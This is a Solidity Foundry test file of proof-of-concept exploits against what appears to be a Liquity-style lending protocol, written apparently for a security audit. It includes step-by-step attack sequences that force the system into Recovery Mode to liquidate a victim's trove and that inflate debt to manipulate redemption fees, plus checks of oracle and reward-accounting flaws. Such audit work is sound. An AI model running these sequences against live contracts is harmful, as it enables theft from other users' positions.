pragma solidity 0.8.19;

import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TestSetup} from "./TestSetup.sol";
import {IFactory} from "../../contracts/interfaces/IFactory.sol";
import {StakedBTC} from "../../contracts/mock/StakedBTC.sol";
import {BorrowerOperations} from "../../contracts/core/BorrowerOperations.sol";
import {TroveManager} from "../../contracts/core/TroveManager.sol";
import {MultiCollateralHintHelpers} from "../../contracts/core/helpers/MultiCollateralHintHelpers.sol";
import {StorkOracleWrapper} from "../../contracts/wrappers/StorkOracleWrapper.sol";
import {IBimaVault} from "../../contracts/interfaces/IVault.sol";

/**
 * @title MockStorkOracle
 * @dev A mock implementation of the Stork Oracle for testing purposes
 */
contract MockStorkOracle {
    uint64 private _timestampNs;
    int192 private _quantizedValue;

    function set(uint64 timestampNs, int192 quantizedValue) external {
        _timestampNs = timestampNs;
        _quantizedValue = quantizedValue;
    }

    function getTemporalNumericValueV1(bytes32) external view returns (uint64 timestampNs, int192 quantizedValue) {
        return (_timestampNs, _quantizedValue);
    }
}

/**
 * @title PoCTest
 * @dev Test contract for demonstrating vulnerabilities
 */
contract PoCTest is TestSetup {
    address attacker;
    address victim;
    address attacker2;
    StakedBTC stakedBTC2;
    TroveManager sbtcTroveManager;
    TroveManager sbtc2TroveManager;
    MultiCollateralHintHelpers hintHelpers;

    function setUp() public override {
        super.setUp();
        hintHelpers = new MultiCollateralHintHelpers(address(borrowerOps), INIT_GAS_COMPENSATION);

        attacker = makeAddr("Attacker");
        victim = makeAddr("Victim");
        attacker2 = makeAddr("Attacker2");

        vm.startPrank(users.owner);

        // Deploy another troveManager instance
        stakedBTC2 = new StakedBTC();
        IFactory.DeploymentParams memory params = IFactory.DeploymentParams({
            minuteDecayFactor: 999037758833783000,
            redemptionFeeFloor: 5e15,
            maxRedemptionFee: 1e18,
            borrowingFeeFloor: 0,
            maxBorrowingFee: 0,
            interestRateInBps: 0,
            maxDebt: 1_000_000e18, // 1M USD
            MCR: 2e18 // 200%
        });

        // Set up price feed for stakedBTC2
        priceFeed.setOracle(
            address(stakedBTC2),
            address(mockOracle),
            80000, // heartbeat
            bytes4(0x00000000), // Read pure data assume stBTC is 1:1 with BTC
            18, // sharePriceDecimals
            false // _isEthIndexed
        );

        // Deploy new instance with stakedBTC2
        factory.deployNewInstance(
            address(stakedBTC2),
            address(priceFeed),
            address(0), // customTroveManagerImpl
            address(0), // customSortedTrovesImpl
            params
        );

        // Distribute tokens to users
        deal(address(stakedBTC), users.owner, 1e6 * 1e18);
        deal(address(stakedBTC), attacker, 1e6 * 1e18);
        deal(address(stakedBTC), victim, 1e6 * 1e18);
        deal(address(stakedBTC), attacker2, 1e6 * 1e18);
        deal(address(stakedBTC2), users.owner, 1e6 * 1e18);
        deal(address(stakedBTC2), attacker, 1e6 * 1e18);

        // Get TroveManager instances
        sbtcTroveManager = TroveManager(factory.troveManagers(0));
        sbtc2TroveManager = TroveManager(factory.troveManagers(1));

        // Open initial troves
        _openTrove(sbtcTroveManager, 100000e18, 3e18);
        _openTrove(sbtc2TroveManager, 100000e18, 3e18);

        // Deposit debt token into the stability pool
        uint256 debtTokenBalance = debtToken.balanceOf(users.owner);
        debtToken.approve(address(stabilityPool), debtTokenBalance);
        stabilityPool.provideToSP(debtTokenBalance);

        // Skip bootstrap period
        vm.warp(block.timestamp + 14 days + 1);
        _updateOracle(60000 * 1e8);
    }

    /**
     * @dev Updates the mock oracle with a new price
     * @param price The new price to set
     */
    function _updateOracle(int256 price) internal {
        (uint80 roundId, , , , ) = mockOracle.latestRoundData();
        mockOracle.setResponse(roundId + 1, price, block.timestamp, block.timestamp, roundId + 1);
    }

    /**
     * @dev Opens a new trove
     * @param troveManager The TroveManager instance
     * @param debtAmount The amount of debt to borrow
     * @param cr The collateral ratio
     */
    function _openTrove(TroveManager troveManager, uint256 debtAmount, uint256 cr) internal {
        IERC20 collateral = troveManager.collateralToken();
        uint256 price = troveManager.fetchPrice();
        bool inRecoveryMode = borrowerOps.checkRecoveryMode(price);
        uint256 borrowingRate = inRecoveryMode ? 0 : troveManager.getBorrowingRateWithDecay();
        uint256 gasCompensation = INIT_GAS_COMPENSATION;
        uint256 adjustedDebtAmount = ((debtAmount - gasCompensation) * 1e18 - 1) / (1e18 + borrowingRate) + 1;
        uint256 collateralAmount = (debtAmount * cr) / price + 1;

        collateral.approve(address(borrowerOps), collateralAmount);
        (, address caller, ) = vm.readCallers();
        borrowerOps.openTrove(troveManager, caller, 1e18, collateralAmount, adjustedDebtAmount, address(0), address(0));
    }

    /**
     * @dev Redeems collateral from a trove
     * @param troveManager The TroveManager instance
     * @param redemptionAmount The amount of debt to redeem
     */
    function _redeemCollateral(TroveManager troveManager, uint256 redemptionAmount) internal {
        uint256 price = troveManager.fetchPrice();
        (address firstRedemptionHint, uint256 partialRedemptionHintNICR, uint256 truncatedDebtAmount) = hintHelpers
            .getRedemptionHints(troveManager, redemptionAmount, price, 0);

        troveManager.redeemCollateral(
            truncatedDebtAmount,
            firstRedemptionHint,
            address(0),
            address(0),
            partialRedemptionHintNICR,
            0,
            1e18
        );
    }

    /**
     * @dev Prints the Total Collateral Ratio (TCR)
     */
    function _printTCR() internal {
        console.log("TCR =", borrowerOps.getTCR());
    }

    /**
     * @dev Test case: Forcing the system into Recovery Mode
     */
    function test_poc_forcingSystemIntoRecoveryMode() public {
        console.log("Initial TCR:");
        _printTCR();

        // Step 1: Victim opens a trove with ICR lower than CCR
        vm.startPrank(victim);
        _openTrove(sbtcTroveManager, 100_000e18, 2e18);

        // Step 2: Attacker opens a minimal position with CR slightly above 225%
        vm.startPrank(attacker);
        _openTrove(sbtc2TroveManager, 2_000e18, 2.26e18);

        // Step 3: Open a large position to bring TCR to exactly 225%
        (uint256 totalPricedCollateral, uint256 totalDebt) = borrowerOps.getGlobalSystemBalances();
        uint256 debtAmount = ((totalPricedCollateral - (225 * totalDebt * 1e18) / 100) * 100) / (225 - 200) / 1e18;
        uint256 CR = 2e18;
        _openTrove(sbtcTroveManager, debtAmount, CR);

        console.log("TCR after opening large position:");
        _printTCR();

        // Step 4: Redeem the position opened in step 2 to trigger Recovery Mode
        (, uint256 attackerDebt) = sbtc2TroveManager.getTroveCollAndDebt(attacker);
        uint256 redemptionAmount = attackerDebt - INIT_GAS_COMPENSATION; // 200e18 is the gas compensation
        _redeemCollateral(sbtc2TroveManager, redemptionAmount);

        console.log("TCR after redemption (should be in Recovery Mode):");
        _printTCR();

        // Step 5: Liquidate victim's trove (CR < 225%)
        liquidationMgr.liquidate(sbtcTroveManager, victim);

        console.log("Victim's trove liquidated");

        // Verify victim's trove is closed
        (uint256 victimColl, uint256 victimDebt) = sbtcTroveManager.getTroveCollAndDebt(victim);
        assertEq(victimColl, 0, "Victim's trove collateral should be zero");
        assertEq(victimDebt, 0, "Victim's trove debt should be zero");

        console.log("Final TCR:");
        _printTCR();
    }

    /**
     * @dev Test case: Normal redemption process
     */
    function test_poc_normalRedemption() public {
        vm.startPrank(attacker);

        // Step 1: Open a trove
        uint256 debtAmount = 100000e18;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 2: Perform redemption
        uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
        _redeemCollateral(sbtcTroveManager, redemptionAmount);

        uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
        console.log("Redemption Rate: %18e%", redemptionRate);
    }

    /**
     * @dev Test case: Redemption with debt inflation
     */
    function test_poc_redemptionWithDebtInflation() public {
        vm.startPrank(attacker);

        // Step 1: Open a trove
        uint256 debtAmount = 100_000e18;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 2: Attacker2 opens a large trove to inflate total debt
        vm.startPrank(attacker2);
        uint256 largeDebtAmount = 500_000e18; // 0.5M DEBT
        _openTrove(sbtcTroveManager, largeDebtAmount, 3e18);

        // Step 3: Perform redemption
        vm.startPrank(attacker);
        uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
        _redeemCollateral(sbtcTroveManager, redemptionAmount);

        // Step 4: Attacker2 closes their large trove
        vm.startPrank(attacker2);
        borrowerOps.closeTrove(sbtcTroveManager, attacker2);

        uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
        console.log("Manipulated Redemption Rate: %18e%", redemptionRate);
    }

    /**
     * @dev Test case: Stork Oracle stale price
     */
    function test_poc_storkOracleStalePrice() public {
        vm.startPrank(users.owner);

        // Create mock Stork Oracle and wrapper
        MockStorkOracle mockOracle = new MockStorkOracle();
        StorkOracleWrapper wrapper = new StorkOracleWrapper(address(mockOracle), bytes32(0));

        // Set initial price to $60,000
        mockOracle.set(uint64(block.timestamp * 1e9), 60_000e18);

        // Configure price feed to use the Stork Oracle wrapper
        priceFeed.setOracle(address(stakedBTC), address(wrapper), 80_000, bytes4(0), 8, false);

        assertEq(priceFeed.fetchPrice(address(stakedBTC)), 60_000e18);

        // Simulate time passing (1 second)
        vm.warp(block.timestamp + 1);

        // Update oracle price to $50,000
        mockOracle.set(uint64(block.timestamp * 1e9), 50_000e18);

        assertEq(priceFeed.fetchPrice(address(stakedBTC)), 50_000e18);
    }

    /**
     * @dev Test case: Stability Pool emptied by liquidation return incorrect claimable amount
     */
    function test_poc_stabilityPool_inaccurateClaimableAmount() public {
        address user = users.user1;
        address user2 = users.user2;
        deal(address(stakedBTC), user, 1_000_000e18);
        deal(address(stakedBTC), user2, 1_000_000e18);

        // Mock Bima Vault's allocateNewEmissions function for demonstration purposes
        vm.mockCall(
            address(bimaVault),
            abi.encodeWithSelector(IBimaVault.allocateNewEmissions.selector),
            abi.encode(100e18 * 86400 * 7) // 100 tokens per week
        );

        // Step 1: User opens a trove
        vm.startPrank(user);
        uint256 debtAmount = 50_000e18; // 50,000 DEBT
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 2: User deposits all borrowed DEBT into Stability Pool
        stabilityPool.provideToSP(debtAmount - INIT_GAS_COMPENSATION);

        uint256 stabilityPoolBalanceBefore = stabilityPool.getTotalDebtTokenDeposits();
        console.log("Stability Pool balance before liquidation:", stabilityPoolBalanceBefore);

        vm.startPrank(user2);
        debtAmount = stabilityPoolBalanceBefore;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 3: Simulate price drop to make the trove undercollateralized
        vm.warp(block.timestamp + 1);
        _updateOracle(59_000e8);

        // Step 4: Triggers liquidation
        liquidationMgr.liquidate(sbtcTroveManager, user2);

        // Step 5: Check Stability Pool balance after liquidation
        uint256 stabilityPoolBalanceAfter = stabilityPool.getTotalDebtTokenDeposits();
        console.log("Stability Pool balance after liquidation:", stabilityPoolBalanceAfter);

        // Assert that the Stability Pool is emptied
        assertEq(stabilityPoolBalanceAfter, 0, "Stability Pool should be empty after liquidation");
        //
        // Step 6: Check claimable rewards
        // The correct amount should be more than zero
        uint256 claimableRewards = stabilityPool.claimableReward(user);
        console.log("Claimable rewards:", claimableRewards);

        assertTrue(claimableRewards > 0);
    }

    function test_poc_stabilityPool_incorrectMarginalBimaGain() public {
        address user = users.user1;
        address user2 = users.user2;
        address user3 = makeAddr("User3");
        deal(address(stakedBTC), user, 1e6 * 1e18);
        deal(address(stakedBTC), user2, 1e6 * 1e18);
        deal(address(stakedBTC), user3, 1e6 * 1e18);

        // Mock Bima Vault's allocateNewEmissions function for demonstration purposes
        vm.mockCall(
            address(bimaVault),
            abi.encodeWithSelector(IBimaVault.allocateNewEmissions.selector),
            abi.encode(100e18 * 86400 * 7) // 100 tokens per week
        );

        // Step 1: User opens a trove
        vm.startPrank(user);
        uint256 debtAmount = 50000e18; // 50,000 DEBT
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 2: User deposits all borrowed DEBT into Stability Pool
        stabilityPool.provideToSP(debtAmount - INIT_GAS_COMPENSATION);

        uint256 stabilityPoolBalanceBefore = stabilityPool.getTotalDebtTokenDeposits();
        console.log("Stability Pool balance before liquidation:", stabilityPoolBalanceBefore);

        vm.startPrank(user2);
        debtAmount = stabilityPoolBalanceBefore;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 3: Simulate price drop to make the trove undercollateralized
        vm.warp(block.timestamp + 1);
        _updateOracle(59000 * 1e8);

        // Step 4: Triggers liquidation
        liquidationMgr.liquidate(sbtcTroveManager, user2);

        // Step 5: Check Stability Pool balance after liquidation
        uint256 stabilityPoolBalanceAfter = stabilityPool.getTotalDebtTokenDeposits();
        console.log("Stability Pool balance after liquidation:", stabilityPoolBalanceAfter);

        // Assert that the Stability Pool is emptied
        assertEq(stabilityPoolBalanceAfter, 0, "Stability Pool should be empty after liquidation");

        // Step 6: Check claimable rewards
        // The correct amount should be more than zero
        uint256 claimableRewards = stabilityPool.claimableReward(user);
        console.log("User claimable rewards:", claimableRewards);

        // Step 7: User2 opens a trove and deposits into Stability Pool
        vm.startPrank(user2);
        debtAmount = 10000e18;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);
        stabilityPool.provideToSP(debtAmount - INIT_GAS_COMPENSATION);

        // Step 8: User3 opens a trove
        vm.startPrank(user3);
        debtAmount = 2000e18;
        _openTrove(sbtcTroveManager, debtAmount, 2e18);

        // Step 9: Simulate price drop to make the user3's trove undercollateralized
        vm.warp(block.timestamp + 1);
        _updateOracle(58000 * 1e8);

        // Step 10: Triggers liquidation
        liquidationMgr.liquidate(sbtcTroveManager, user3);

        // Step 11: Check claimable rewards
        // The correct claimable rewards should be the same as the previous amount as
        // the user's deposit was already emptied in the previous epoch
        uint256 claimableRewards2 = stabilityPool.claimableReward(user);
        console.log("User claimable rewards:", claimableRewards2);
        assertEq(claimableRewards, claimableRewards2);
    }
}
